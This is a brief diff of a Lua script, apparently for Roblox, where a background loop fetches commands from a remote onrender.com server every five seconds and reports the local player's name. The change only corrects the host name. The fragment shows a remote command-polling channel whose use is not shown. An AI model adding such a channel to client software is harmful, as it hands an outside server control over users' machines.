@@ -45,7 +45,7 @@ task.spawn(function()
         while task.wait(5) do -- Запрашиваем команды каждые 5 секунд
             local success, result = pcall(function()
                 return requestFunc({
-                    Url = "https://tumbahub-server.onrender.com/api/get_command?username=" .. LocalPlayer.Name,
+                    Url = "https://tubmahub-server.onrender.com/api/get_command?username=" .. LocalPlayer.Name,
                     Method = "GET"
                 })
             end)
